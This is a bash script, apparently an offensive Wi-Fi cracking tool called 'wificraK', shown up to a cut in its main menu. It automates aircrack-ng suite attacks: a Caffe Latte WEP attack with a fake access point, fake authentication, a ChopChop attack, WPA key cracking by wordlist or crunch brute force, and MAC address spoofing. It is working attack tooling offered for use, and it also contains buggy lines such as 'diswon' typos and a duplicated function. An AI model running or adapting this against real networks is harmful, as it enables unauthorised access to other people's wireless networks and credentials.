#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

I_monitor=0

################################################## Ctrl +C Options ##################################################

function ctrl_c(){
    echo -ne "\n${redColour}[!]${endColour} ${grayColour}Exiting....\n${endColour}"
    tput cnorm
    echo -ne "${greenColour}\n Bye bye ...\n${endColour}"

	airmon-ng stop iw_wificraKmon > /dev/null 2&>1

    ifconfig iw_wificraK down
    ip link set iw_wificraK name $networkCard
    ifconfig $networkCard up 

    clear
    rm -r 1 iface.txt dnsmasq.conf hostapd.conf > /dev/null 2>&1
    sleep 1.5;exit 0

}

################################################## Banners ##################################################

function wificraK_banner(){

    clear
    echo -ne "${greenColour}██╗    ██╗██╗███████╗██╗ ██████╗██████╗  █████╗ ██╗  ██╗${endColour}\n"
    sleep 0.5
    echo -ne "${greenColour}██║    ██║██║██╔════╝██║██╔════╝██╔══██╗██╔══██╗██║ ██╔╝${endColour}\n"
    sleep 0.5
    echo -ne "${greenColour}██║ █╗ ██║██║█████╗  ██║██║     ██████╔╝███████║█████╔╝ ${endColour}\n"
    echo -ne "${greenColour}██║███╗██║██║██╔══╝  ██║██║     ██╔══██╗██╔══██║██╔═██╗ ${endColour}\n"
    sleep 0.5
    echo -ne "${greenColour}╚███╔███╔╝██║██║     ██║╚██████╗██║  ██║██║  ██║██║  ██╗${endColour}${grayColour} - by J4ckris${endColour}\n"
    echo -ne "${greenColour} ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝${endColour}"
    echo -ne "\n"
	sleep 3
}

function all_banners_menu(){
    random_number=$(($RANDOM % 5 + 1))

    if [ "$random_number" == "1" ];then

        arts_1

    elif [ "$random_number" == "2" ];then

        arts_2

    elif [ "$random_number" == "3" ];then

        arts_3

    elif [ "$random_number" == "4" ];then

        arts_4

    elif [ "$random_number" == "5" ];then

        arts_5

    fi

}

function arts_1(){


    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠐⠢⠀⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠉⠀⠀⠀⠱⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣮⣑⠡⡀⡀⠀⢀⡇⠀⠀⠀⠀${endColour}"
	sleep 0.5
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣄⠈⣌⠪⡄⢰⢡⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣾⣀⠈⢂⠃⡈⠘⣄⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣿⣷⣄⠤⢢⠁⡠⠂⠢⡀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠏⣸⡿⠟⣾⠓⠉⡖⠀⠀⠈⢂${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣆⡏⢸⠟⠀⣾⠀⠈⢡⡠⠂⠀⠈${endColour}"
    echo -e "${blueColour}⠱⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⡀⡇⢈⠐⠠⡟⠀⠀⢞⡿⢅⠄⢀${endColour}"
    echo -e "${blueColour}⠀⠹⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠜⠊⢛⡃⠘⠀⠀⡇⠀⡈⠶⠄⠒⠂⡔${endColour}"
	sleep 0.5
    echo -e "${blueColour}⠀⠀⠘⣿⣿⣿⣷⣄⣀⠀⠤⡠⡤⠒⠫⠱⠀⣼⠧⠀⠀⠀⢁⠠⢱⠤⠒⠒⣠⠇${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠘⢿⣿⣿⣿⣾⡷⡋⣞⠔⡣⠎⠙⠂⠘⠒⠲⡖⡒⠒⡶⢙⠀⠈⠉⣸⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠉⠻⣿⣿⡿⣿⣿⣯⠪⡖⠤⠤⠔⣀⣤⡃⠀⠀⡁⠀⣀⠄⠊⡜⠀${endColour}"
	sleep 0.5
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⡌⠙⢿⣾⡫⠅⠂⠉⠀⠀⠁⠪⢁⠈⠉⠀⠀⣸⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠉⠀⠀${endColour}"

}


function arts_2(){

    echo -e "${blueColour}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢛⣯⣝⣿⣿⣿⣿⣿⣿${endColour}"
    echo -e "${blueColour}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣶⣿⣿⣿⣎⣿⣿⣿⣿⣿${endColour}"
    echo -e "${blueColour}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠑⠮⣞⢿⢿⣿⡿⢸⣿⣿⣿⣿${endColour}"
    echo -e "${blueColour}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠻⣷⠳⣕⢻⡏⡞⣿⣿⣿⣿${endColour}"
    echo -e "${blueColour}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠁⠿⣷⡽⣼⢷⣧⠻⣿⣿⣿${endColour}"
	sleep 0.5
    echo -e "${blueColour}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⠀⠈⠻⣛⡝⣾⢟⣽⣝⢿⣿${endColour}"
    echo -e "${blueColour}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣰⠇⢀⣠⠁⣬⣶⢩⣿⣿⣷⡽${endColour}"
    echo -e "${blueColour}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠹⢰⡇⣠⣿⠁⣿⣷⡞⢟⣽⣿⣷${endColour}"
    echo -e "${blueColour}⣎⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢃⢿⢸⡷⣯⣟⢠⣿⣿⡡⢀⡺⣻⡿${endColour}"
	sleep 0.5
    echo -e "${blueColour}⣿⣆⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣣⣵⡤⢼⣧⣿⣿⢸⣿⢷⣉⣻⣭⣽⢫${endColour}"
    echo -e "${blueColour}⣿⣿⣧⠀⠀⠀⠈⠻⠿⣿⣛⢟⢛⣭⣔⣎⣿⠃⣘⣿⣿⣿⡾⣟⡎⣛⣭⣭⠟⣸${endColour}"
    echo -e "${blueColour}⣿⣿⣿⣧⡀⠀⠀⠀⠁⢈⢴⠡⣫⢜⣱⣦⣽⣧⣭⣍⢩⢭⣭⢉⡦⣿⣷⣶⠇⣿${endColour}"
    echo -e "${blueColour}⣿⣿⣿⣿⣿⣶⣄⠀⠀⢀⠀⠀⠐⣕⢩⣛⣛⣫⠿⠛⢼⣿⣿⢾⣿⠿⣻⣵⢣⣿${endColour}"
	sleep 0.5
    echo -e "${blueColour}⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⢳⣦⡀⠁⢔⣺⣽⣶⣿⣿⣾⣕⡾⣷⣶⣿⣿⠇⣿⣿${endColour}"
    echo -e "${blueColour}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣥⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣶⣿⣿${endColour}"

}


function arts_3(){

    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠔⠒⠊⠉⠉⠉⠉⠙⠒⠲⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⣠⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⣠⠞⠁⠀⣀⠀⠀⠀⠀⢀⣀⡀⠀⢀⣀⠀⠀⠀⠀⢀⠀⠈⠱⣄⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⡴⠁⡠⣴⠟⠁⢀⠤⠂⡠⠊⡰⠁⠇⢃⠁⠊⠑⠠⡀⠀⢹⣶⢤⡈⢣⡀⠀${endColour}"
    sleep 0.5
	echo -e "${blueColour}⠀⡼⢡⣾⢓⡵⠃⡐⠁⠀⡜⠀⠐⠃⣖⣲⡄⠀⠀⠱⠀⠈⠢⠈⢮⣃⣷⢄⢳⠀${endColour}"
    echo -e "${blueColour}⢰⠃⣿⡹⣫⠃⡌⠀⠄⠈⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠣⠀⠀⠱⠈⣯⡻⣼⠈⡇${endColour}"
    echo -e "${blueColour}⡞⢈⢿⡾⡃⠰⠀⠀⠀⠀⠀⠀⠀⠀⣘⣋⠀⠀⠀⠀⠀⠀⠀⠀⠇⢸⢿⣿⢠⢸${endColour}"
	sleep 0.5
    echo -e "${blueColour}⡇⢸⡜⣴⠃⠀⠀⠀⠀⠀⣀⣀⣤⡎⠹⡏⢹⣦⣀⣀⠀⠀⠀⠀⢈⠘⣧⢣⡟⢸${endColour}"
    echo -e "${blueColour}⢧⢊⢳⡏⣤⠸⠀⠀⠀⢸⣿⣿⣿⡇⢰⡇⢠⣿⣿⣿⣷⠀⠀⠀⡆⢸⢹⡼⣱⢸${endColour}"
    echo -e "${blueColour}⢸⡘⢷⣅⣿⢂⢃⠐⠂⣿⣿⣿⣿⣿⣼⣇⣾⣿⣿⣿⣿⠁⠂⡰⡠⣿⢨⡾⠃⡇${endColour}"
	sleep 0.5
    echo -e "${blueColour}⠀⢳⡱⣝⠻⡼⣆⡁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠐⣰⣇⠿⣋⠝⡼⠀${endColour}"
    echo -e "${blueColour}⠀⠀⢳⡈⢻⠶⣿⣞⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢣⣿⡶⠟⢉⡼⠁⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠙⢦⡑⠲⠶⠾⠿⢟⣿⣿⣿⣿⣿⣿⣿⣿⡛⠿⠷⠶⠶⠊⡡⠋⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠙⠦⣝⠛⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⡛⠛⠛⣋⠴⠋⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠦⠿⣿⣿⣿⣿⣿⣿⠿⠧⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀${endColour}"

}
function arts_4(){

    echo -e "${blueColour}⣿⣿⣿⣿⣿⣿⣿⣿⠿⢛⣫⣭⣵⣶⣶⣶⣶⣦⣭⣍⣛⠿⣿⣿⣿⣿⣿⣿⣿⣿${endColour}"
    echo -e "${blueColour}⣿⣿⣿⣿⣿⠟⣫⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣍⠻⣿⣿⣿⣿⣿${endColour}"
    echo -e "${blueColour}⣿⣿⣿⠟⣡⣾⣿⠿⣿⣿⣿⣿⡿⠿⢿⣿⡿⠿⣿⣿⣿⣿⡿⣿⣷⣎⠻⣿⣿⣿${endColour}"
    echo -e "${blueColour}⣿⣿⢋⣾⢟⠋⣠⣾⡿⣛⣽⢟⣵⢏⣾⣸⡼⣾⣵⣮⣟⢿⣿⡆⠉⡛⢷⡜⢿⣿${endColour}"
    echo -e "${blueColour}⣿⢃⡞⠁⡬⢊⣼⢯⣾⣿⢣⣿⣯⣼⠩⠍⢻⣿⣿⣎⣿⣷⣝⣷⡑⠼⠈⡻⡌⣿${endColour}"
    echo -e "${blueColour}⡏⣼⠀⢆⠔⣼⢳⣿⣻⣷⣿⣿⣿⣿⣿⣴⣿⣿⣿⣿⣜⣿⣿⣎⣷⠐⢄⠃⣷⢸${endColour}"
	sleep 0.5
    echo -e "${blueColour}⢡⡷⡀⢁⢼⣏⣿⣿⣿⣿⣿⣿⣿⣿⠧⠴⣿⣿⣿⣿⣿⣿⣿⣿⣸⡇⡀⠀⡟⡇${endColour}"
    echo -e "${blueColour}⢸⡇⢣⠋⣼⣿⣿⣿⣿⣿⠿⠿⠛⢱⣆⢰⡆⠙⠿⠿⣿⣿⣿⣿⡷⣧⠘⡜⢠⡇${endColour}"
    echo -e "${blueColour}⡘⡵⡌⢰⠛⣇⣿⣿⣿⡇⠀⠀⠀⢸⡏⢸⡟⠀⠀⠀⠈⣿⣿⣿⢹⡇⡆⢃⠎⡇${endColour}"
    echo -e "${blueColour}⡇⢧⡈⠺⠀⡽⡼⣯⣽⠀⠀⠀⠀⠀⠃⠸⠁⠀⠀⠀⠀⣾⣽⢏⢟⠀⡗⢁⣼⢸${endColour}"
    echo -e "${blueColour}⣿⡌⢎⠢⣄⢃⠹⢾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣯⠏⠸⣀⠴⣢⢃⣿${endColour}"
	sleep 0.5
    echo -e "${blueColour}⣿⣿⡌⢷⡄⣉⠀⠡⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡜⠀⢉⣠⡶⢃⣾⣿${endColour}"
    echo -e "${blueColour}⣿⣿⣿⣦⡙⢮⣍⣉⣁⣀⡠⠀⠀⠀⠀⠀⠀⠀⠀⢤⣀⣈⣉⣉⣵⢞⣴⣿⣿⣿${endColour}"
    echo -e "${blueColour}⣿⣿⣿⣿⣿⣦⣙⠢⣤⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⢤⣤⣤⠴⣋⣴⣿⣿⣿⣿⣿${endColour}"
    echo -e "${blueColour}⣿⣿⣿⣿⣿⣿⣿⣿⣶⣭⣙⣀⠀⠀⠀⠀⠀⠀⣀⣘⣭⣴⣾⣿⣿⣿⣿⣿⣿⣿${endColour}"


}

function arts_5(){

    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⠤⠤⠤⠤⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠊⠁⠀⢀⣀⣀⠀⠠⠤⢀⡑⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠅⠒⠈⠉⠀⠀⠀⠀⢀⡀⠀⠘⡀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
	sleep 0.5
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⢠⣤⣄⡀⠀⢀⣴⡾⠛⠛⠓⠀⢱⠸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠋⠉⣩⠻⠖⡘⠛⣴⣶⣦⣤⠴⢄⣧⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠂⠾⠿⠿⠀⣾⡀⠉⠉⠁⠀⠀⠀⣿⠺⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⢿⠇⢠⠠⠤⢠⡤⠂⢸⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
	sleep 0.5
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡠⣖⣁⣻⣶⣾⣥⣤⣴⣿⡏⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡻⡛⣉⣻⣿⡭⠄⢀⠞⠀⣴⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣌⠀⠈⣿⡇⠀⠈⡠⠪⠏⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡔⠙⢷⡤⠻⠇⠤⠊⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⡔⠁⢠⠀⠀⠙⠢⣀⠀⠀⠀⠀⣠⠇⢳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
	sleep 0.5
    echo -e "${blueColour}⠀⢀⡀⠤⠀⠒⠊⠉⠀⠀⡇⠀⠘⡄⠀⠀⠀⠈⠑⢢⡤⢼⡁⠀⢸⠀⠉⢶⠠⢀⡀⠀⠀⠀⠀⠀${endColour}"
    echo -e "${blueColour}⡎⠁⠀⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⢻⢦⠀⠀⠀⡴⠋⠀⠀⠙⡄⢸⡆⠀⠈⡄⠀⠈⠉⠐⠢⡄⠀${endColour}"
    echo -e "${blueColour}⠁⠀⠀⠀⠀⠀⠀⠀⠀⠠⠃⠀⠀⠈⡄⠑⣄⡞⢆⠀⠀⢀⠜⠙⠊⢱⠀⠀⠘⡄⠀⠀⠀⠀⠘⡄${endColour}"
    echo -e "${blueColour}⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠄⠀⠀⣧⠀⠈⠀⢰⠋⠁⠘⣄⠀⠀⠸⡄⠀⠠⠃⠀⠀⠀⠀⠀⢳${endColour}"
    echo -e "${blueColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠐⠀⠂⠒⠐⠒⠀⠀⠂⠒⠒⠒⠒⠐⠂⠒⠀⠒⠂⠀⠀⠀${endColour}"


}
################################################## Caffe Latte ##################################################
function CaffeLatte(){
    clear
    all_banners_menu

    xterm -hold -e "airodump-ng iw_wificraKmon" &
    xterm_airodump_PID=$!

    echo -ne "\n${blueColour}[*] Set the name of the AP: ${endColour}" && read AP_name
    echo -ne "\n${blueColour}[*] Set the BSSID of the AP: ${endColour}" && read AP_BSSID
    echo -ne "\n${blueColour}[*] Set the Channel of the AP: ${endColour}" && read Channel
    
    kill -9 $xterm_airodump_PID
    wait $airodump_xterm_PID 2>/dev/null

    xterm -hold -e "airodump-ng -c $Channel -w $AP_name --essid $AP_name iw_wificraKmon" &

    airodump_filter_xterm_PID=$!

    xterm -hold -e "airbase-ng -c $Channel -a $AP_BSSID -e '$AP_name' -L -W 1 -x 100 iw_wificraKmon" &

    xterm_airbase_PID=$!

    echo -ne "${blueColour}[*]${endColour} ${grayColour}The attack has been started, just wait 5 minutes${endColour}"

    sleep 300; kill -9 $airodump_filter_xterm_PID;wait $airodump_filter_xterm_PID 2>/dev/null
    kill -9 $xterm_airbase_PID; wait $xterm_airbase_PID 2>/dev/null


    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Starting aircrack-ng ${endColour}\n"
    mkdir Captures 2>/dev/null

    mv $AP_name*.cap Captures/$AP_name-wep-caffelatte.cap 2>/dev/null

    xterm -hold -e "aircrack-ng -e '$AP_name' Captures/$AP_name-wep-caffelatte.cap " & disown

    echo -ne "\n${blueColour}[*]${endColour}{grayColour} Aircrack-ng has been started${endColour}\n"
    sleep 10

    menu
}
################################################## Auth DoS ##################################################


function authentication_attack(){

    clear
    xterm -hold -e "airodump-ng iw_wificraKmon" &
    airodump_xterm_PID=$!

    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Name: ${endColour}" && read APessid
	echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Channel: ${endColour}" && read Channel
	echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point BSSID: ${endColour}" && read AP_BSSID


    kill -9 $airodump_xterm_PID
    wait $airodump_xterm_PID 2>/dev/null
    
    sleep 10; xterm -hold -e "aireplay-ng -1 0 -e ${APessid} -e '$APessid' -a '$AP_BSSID' -h '$Current_mac' iw_wificraKmon" &

    clear
    menu

}

################################################## ChopChop attack ##################################################

function ChopChop_attack(){

    xterm -hold -e "airodump-ng iw_wificraKmon" &
    airodump_xterm_PID=$!

    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Name: ${endColour}" && read APSSID

    kill -9 $airodump_xterm_PID
    wait $airodump_xterm_PID 2>/dev/null

    mkdir Captures 2>/dev/null

    pushd Captures  > /dev/null 2>&1

    xterm -hold -e "aireplay-ng -4 -e '$APSSID' -h '$Current_mac' iw_wificraKmon" &
    echo -ne "\n${blueColour}[*]${endColour}${grayColour} ChopChop attack has been started, files will be in the Captures directory${endColour}"
    sleep 10

    clear
    menu

}

################################################## Password Cracking Funcs ##################################################
function cracking_pass(){

    ## Option yes/no
    while true; do 

    echo -ne "${blueColour}[*]${endColour}${grayColour} Do you want to start the cracking process [ y/n ]: ${endColour}"

    read yn
    case $yn in

        [yY] ) echo -ne "\n";
        
            break;;
            
        [nN] ) echo -ne "\n";
        
            menu;;

        *) echo -ne "\n";;

    esac
    done

    ## Cracking Using Crunch

    while true;do

    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Do you want yo start a brute-force attack using crunch [ y/n ]:${endColour} "

    read yn

    case $yn in

        [yY] ) echo -ne "\n";
         
            crunch_options;break;;
            
        [nN] ) echo -ne "\n";
         
            break;;

        *) echo -ne "\n";;

    esac
    done

    ## Dictionary
    while true; do

    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Do you want yo start a dictionary attack [ y/n ]:${endColour} \n"
        read yn
        case $yn in

            [yY] ) dictionary_attack_pass;;


            [nN] ) echo -ne "\n";

                menu;;

            * ) echo -ne "";;

        esac
    done
    clear

}


function password_cracking_options(){

    opc=0

    while [[ $inpu1 -ne 3 ]]; do
		clear
		all_banners_menu
        echo -ne "\n${blueColour}[*]${endColour} ${grayColour}Choose a way to crack your hash:${endColour}\n"
        echo -ne "\n${blueColour}[1]${endColour} ${grayColour}Wordlist${endColour}\n"
        echo -ne "${blueColour}[2]${endColour} ${grayColour}Brute-Force${endColour}\n"
        echo -ne "${blueColour}[3]${endColour} ${grayColour}Back${endColour} \n"
		echo -ne "\n${yellowColour}[>]${endColour}${grayColour}Choose an option > ${endColour}" && read opc


        case $opc in

            1) clear;dictionary_attack_pass;;

            2) clear;crunch_options;;

            3) clear;menu;;

            *) echo -ne "${redColour}[!]${endColour} $opc Invalid Option\n"

            ;;

        esac


    done

}


function password_cracking_options(){

    opc=0

    while [[ $opc -ne 3 ]]; do
        clear
		all_banners_menu

        echo -ne "${blueColour}[*]${endColor}${grayColour}Choose a way to crack you hash: ${endColour}"
        echo -ne "\n${blueColour}[1]${endColour} ${grayColour}Wordlist${endColour}\n"
        echo -ne "${blueColour}[2]${endColour} ${grayColour}Brute-Force${endColour}\n"
        echo -ne "${blueColour}[3]${endColour} ${grayColour}Back${endColour} \n"

        echo -ne "${blueColour}[3]${endColour} ${grayColour}Choose an option > ${endColour}" && read opc

        case $opc in

            1) clear;dictionary_attack_pass;;

            2) clear;crunch_options;;

            3) clear;menu;;

            *) echo -ne "${redColour}[!]${endColour} $opc Invalid Option\n"

            ;;

        esac

    done
    
}

function dictionary_attack_pass(){
    

    clear

    file_path_wpa="None"
    selected_dictionary="None"

    while [ $(test -f "$file_path"; echo $?) -ne 0 ] && [ $(test -f "$selected_dictionary"; echo $?)  != 0 ];do
        clear
		all_banners_menu
        echo -e "${blueColour}[*]${endColour} ${grayColour}Pass the full path of your capture(WPA) file ${endColour}${blueColourColour}(${endColour}${grayColour}Example: /home/kali/wpa_capture${endColour}${blueColour})${endColour}" && read file_path_wpa

        echo -e "\n${blueColour}[*]${endColour}${grayColour} Pass the full path of the dictionary to use: ${endColour}" && read selected_dictionary
    done

    xterm -hold -e "aircrack-ng -w $selected_dictionary $file_path_wpa" & disown ;menu


}



function crunch_options(){

    echo -ne "${blueColour}[*]${endColour}${grayColour}Pass the full path of the file to crack${endColour}${blueColour} (${endColour}${grayColour}Example: /home/kali/capture.cap${endColour}${blueColour})${endColour} : "
    read file_to_crack

    echo -ne "${greyColour}Minimum lenght${endColour}${blueColour} (${endColour}${grayColour}8-63${endColour}${blueColour})${endColour}: "
    read minimum_lenght
    echo -ne "${greyColour}Maximum length ${blueColour}(${endColour}${grayColour}8-63${endColour}${blueColour})${endColour}: "
    read maximum_lenght

    echo -ne "${greyColour}ESSID ${endColour}${blueColour}(${endColour}${greyColour}Example: wifi_name${endColour}${blueColour})${endColour}: "
    read essid_crunch
    crhn="None"
	clear
    while [ $crhn != "5" ] ; do

        clear 
		all_banners_menu
        echo -ne "\n${blueColour}1)${endColour} ${grayColour}Uppercase + Lowercase + numbers${endColour}\n" 
        echo -ne "${blueColour}2)${endColour} ${grayColour}Uppercase + Lowercase${endColour}\n"
        echo -ne "${blueColour}3)${endColour} ${grayColour}Numbers${endColour}\n"
        echo -ne "${blueColour}4)${endColour} ${grayColour}Uppercase${endColour}\n"
        echo -ne "${blueColour}5)${endColour} ${grayColour}Lowercase${endColour}\n"


        echo -ne "${blueColour}6)${endColour} ${grayColour}Back to Menu${endColour}\n"
        echo -ne "${yellowColour}[>]${endColour}${grayColour}Select an option: ${endColour}"


        read crhn

        case $crhn in


            1)clear; sleep 4
                xterm -hold -e "crunch $minimum_lenght $maximum_lenght abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ | aircrack-ng -w - $file_to_crack -e $essid_crunch" & disown ;menu
                ;;
            2)clear; sleep 4
                xterm -hold -e "crunch $minimum_lenght $maximum_lenght abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ | aircrack-ng -w - $file_to_crack -e $essid_crunch" & disown ;menu
                ;;
            3)clear;sleep 4
                xterm -hold -e "crunch $minimum_lenght $maximum_lenght 1234567890 | aircrack-ng -w - $file_to_crack -e $essid_crunch" & diswon;menu
                ;;
            4)clear; sleep 4

                xterm -hold -e "crunch $minimum_lenght $maximum_lenght ABCDEFGHIJKLMNOPQRSTUVWXYZ | aircrack-ng -w - $file_to_crack -e $essid_crunch" & disown;menu

                ;;
            5)clear; sleep 4

                xterm -hold -e "crunch $minimum_lenght $maximum_lenght abcdefghijklmnopqrstuvwxyz | aircrack-ng -w - $file_to_crack $essid_crunch " & diswon;menu
                ;;

        6)clear
        menu
        ;;

            *) echo "${redColour}[!]${endColour}${grayColour}$opc Is An Invalid Option${endColour}\n"

                ;;

        esac

    done

    clear
}


################################################## Mac Chnager func ##################################################
function mac_changer_func(){

    clear
    all_banners_menu

    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Changing the current MAC address...${endColour}"
    ifconfig iw_wificraKmon down
    macchanger -a iw_wificraKmon  > /dev/null 2>&1
    ifconfig iw_wificraKmon up
    echo -ne "\n${blueColour}[*]${endColour}${greenColour} MAC Changed Successfully !!${endColour}"

    sleep 2
    
}

################################################## Main Menu ##################################################
function menu(){

    opc=0


    while [[ $opc != 5 ]];do
        clear
		wificraK_banner

        Current_mac=$(macchanger iw_wificraKmon --show | head -n 1 | awk '{print $3}')
        Permanent_mac=$(macchanger iw_wificraKmon --show | tail -n 1 | awk '{print $3}')
        echo -ne "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}]${endColour}${grayColour} Your Permanent MAC address: ${endColour} ${yellowColour}$Permanent_mac ${endColour}\n"
        echo -ne "${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}]${endColour}${grayColour} Your Current MAC address: ${endColour} ${yellowColour}$Current_mac ${endColour}\n"
        echo -ne "\n"

